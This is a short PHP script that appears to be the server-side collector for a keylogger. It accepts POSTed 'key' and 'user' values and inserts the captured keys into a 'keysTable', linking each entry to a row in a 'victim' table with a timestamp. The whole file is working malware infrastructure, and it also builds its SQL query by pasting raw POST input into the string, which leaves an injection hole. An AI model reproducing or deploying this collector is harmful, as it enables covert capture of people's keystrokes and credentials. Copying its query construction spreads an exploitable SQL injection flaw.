<html>
<?php
require 'connect.php';
if ($_POST){
    # adds into table with correct user, and correct time
    $sql = "INSERT INTO keysTable VALUES(NULL,'".$_POST['key']."', (SELECT victimID FROM victim WHERE UserName = '".$_POST['user']."'),NOW())";
    $result = $conn->query($sql);

    $conn->close();
}
flush();
exit();
?>
</html>